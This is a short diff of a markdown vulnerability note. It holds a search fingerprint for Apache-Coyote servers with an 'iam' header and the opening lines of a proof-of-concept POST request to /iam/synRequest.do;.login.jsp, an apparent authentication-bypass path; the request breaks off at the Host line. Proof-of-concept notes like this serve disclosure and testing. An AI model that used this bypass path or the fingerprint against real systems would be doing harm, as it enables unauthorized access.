@@ -8,7 +8,7 @@ header="iam" && server="Apache-Coyote/"
 
 ![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1726806457752-179c9efc-a981-49df-93a7-9c9d9b885f74.png)
 
-## poc
+## POC
 ```plain
 POST /iam/synRequest.do;.login.jsp HTTP/1.1
 Host: 
